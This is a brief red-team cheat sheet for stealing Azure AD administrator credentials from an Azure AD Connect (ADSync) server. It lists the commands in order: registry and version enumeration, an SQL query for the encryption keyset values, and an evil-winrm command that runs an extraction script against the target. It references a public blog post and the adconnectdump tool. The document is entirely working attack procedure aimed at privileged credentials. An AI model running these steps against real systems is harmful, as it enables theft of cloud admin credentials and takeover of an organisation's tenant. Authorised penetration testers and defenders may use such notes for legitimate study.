### Resource: https://blog.xpnsec.com/azuread-connect-for-redteam/

### Service Name: ADSync

### Tools: https://github.com/dirkjanm/adconnectdump

### STEPS:

#### 1) Enumerate the service instance using the registry

    Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync 

#### 2) Obtain the file and product version

    Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force 

#### 3) Query the values that you might need to add to the script corresponding to your use case (Optional)

    sqlcmd -S HOSTNAME -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration" 

#### 4) Run the powershell script against the target to extract the Azure Admin credentials

    evil-winrm -i IP_ADDRESS -u USERNAME -p "PASSWORD" -s . adconnect.ps1 
